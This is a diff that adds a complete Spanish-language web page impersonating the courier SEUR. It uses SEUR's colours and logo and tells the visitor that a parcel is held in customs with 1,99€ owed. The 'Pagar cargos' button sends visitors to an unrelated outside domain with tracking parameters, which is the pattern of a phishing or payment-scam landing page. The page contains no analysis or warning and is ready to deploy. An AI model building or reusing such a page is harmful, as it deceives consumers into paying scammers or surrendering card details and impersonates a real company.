@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Actualización de Entrega SEUR</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet" />
+  <style>
+    /* Reset & tipografía */
+    * { margin:0; padding:0; box-sizing:border-box; font-family:'Roboto', sans-serif; }
+    a { text-decoration:none; color:inherit; }
+    ul { list-style:none; }
+    body { background:#f9f9f9; color:#333; }
+
+    /* Colores SEUR */
+    :root {
+      --seur-orange:#FF4F00;
+      --seur-blue:  #005FA8;
+      --seur-gray:  #e6e6e6;
+    }
+
+    /* Cabecera */
+    .top-header {
+      background:var(--seur-orange);
+      padding:8px 20px;
+      display:flex;
+      justify-content:flex-end;
+    }
+    .top-header a { color:#fff; margin-left:20px; font-size:14px; }
+
+    .main-nav {
+      background:#fff;
+      display:flex;
+      align-items:center;
+      padding:10px 20px;
+      border-bottom:1px solid var(--seur-gray);
+    }
+    .main-nav .logo { height:32px; margin-right:40px; }
+    .main-nav ul { display:flex; gap:24px; }
+    .main-nav li a { color:var(--seur-blue); font-weight:500; font-size:15px; }
+    .main-nav li a:hover { text-decoration:underline; }
+
+    /* Estado de entrega */
+    .status-container {
+      background:linear-gradient(135deg,var(--seur-orange) 0%,var(--seur-blue) 100%);
+      color:#fff;
+      padding:60px 20px;
+      text-align:center;
+    }
+    .status-container h1 { font-size:2rem; margin-bottom:30px; }
+    .status-box {
+      background:#fff; color:#333;
+      padding:20px; border-radius:8px;
+      max-width:600px; margin:0 auto 20px;
+      box-shadow:0 2px 4px rgba(0,0,0,0.1);
+    }
+    .status-box .row {
+      display:flex; justify-content:space-between;
+      margin-bottom:10px; font-size:0.95rem;
+    }
+    .status-container p { margin:10px 0; font-size:1rem; }
+    .btn-primary {
+      display:inline-block;
+      background:var(--seur-orange);
+      color:#fff; padding:12px 24px;
+      font-size:16px; border-radius:4px;
+      text-decoration:none;
+      font-weight:bold;
+      box-shadow:0 2px 4px rgba(0,0,0,0.1);
+    }
+    .btn-primary:hover { opacity:0.9; }
+
+    /* Servicios adicionales */
+    .services { padding:60px 20px; text-align:center; background:#fff; }
+    .services h2 { font-size:2rem; margin-bottom:40px; color:var(--seur-blue); }
+    .services .grid {
+      display:grid;
+      grid-template-columns:repeat(auto-fit,minmax(160px,1fr));
+      gap:30px; max-width:1000px; margin:0 auto;
+    }
+    .services .item {
+      background:#fff; padding:20px;
+      border-radius:6px;
+      box-shadow:0 1px 3px rgba(0,0,0,0.1);
+    }
+    .services .item .icon { font-size:2.5rem; margin-bottom:16px; color:var(--seur-orange); }
+    .services .item h3 { font-size:1.2rem; margin-bottom:8px; color:var(--seur-blue); }
+    .services .item p { font-size:0.95rem; color:#666; }
+
+    /* Pie de página simple */
+    .footer {
+      background:#fff; padding:20px;
+      border-top:1px solid var(--seur-gray);
+      text-align:center;
+      font-size:0.8rem; color:#999;
+    }
+  </style>
+</head>
+<body>
+  <header class="top-header">
+    <a href="#">Ayuda</a>
+    <a href="#">Iniciar sesión</a>
+  </header>
+  <nav class="main-nav">
+    <img src="https://www.seur.com/images/logo.png" alt="SEUR Logo" class="logo" />
+    <ul>
+      <li><a href="#">Enviar</a></li>
+      <li><a href="#">Recibir</a></li>
+      <li><a href="#">Devolver</a></li>
+      <li><a href="#">Puntos Pickup</a></li>
+      <li><a href="#">Ayuda</a></li>
+    </ul>
+  </nav>
+
+  <section class="status-container">
+    <h1>Actualización de la entrega</h1>
+    <div class="status-box">
+      <div class="row"><div><strong>De:</strong> UTSGLOBAL COMPANY, LTD</div><div><strong>Fecha de entrega:</strong> 09-05-2025</div></div>
+      <div class="row"><div><strong>Número de seguimiento:</strong> GYT456X4R</div></div>
+    </div>
+    <p>Su envío está actualmente en espera en nuestro centro de clasificación.</p>
+    <p>El despacho de aduana está en curso. Pueden aplicarse cargos adicionales.</p>
+    <p><strong>Total adeudado: 1,99€</strong></p>
+    <a href="https://frst-sw.com/?a=74484&o=167647&c=0&co=319977&mt=26" class="btn-primary">Pagar cargos</a>
+  </section>
+
+  <section class="services">
+    <h2>Gestione sus envíos</h2>
+    <div class="grid">
+      <div class="item"><span class="icon">⚠️</span><h3>Alertas de servicios</h3><p>Manténgase informado en tiempo real</p></div>
+      <div class="item"><span class="icon">📦</span><h3>Solicitar suministros</h3><p>Cajas y etiquetas</p></div>
+      <div class="item"><span class="icon">🛃</span><h3>Soluciones aduaneras</h3><p>Optimice sus trámites</p></div>
+      <div class="item"><span class="icon">🔍</span><h3>Seguimiento avanzado</h3><p>Detalles e histórico</p></div>
+      <div class="item"><span class="icon">💶</span><h3>Impuestos y derechos</h3><p>Calcule sus cargos</p></div>
+    </div>
+  </section>
+
+  <footer class="footer">© 2025 SEUR. Todos los derechos reservados.</footer>
+</body>
+</html>
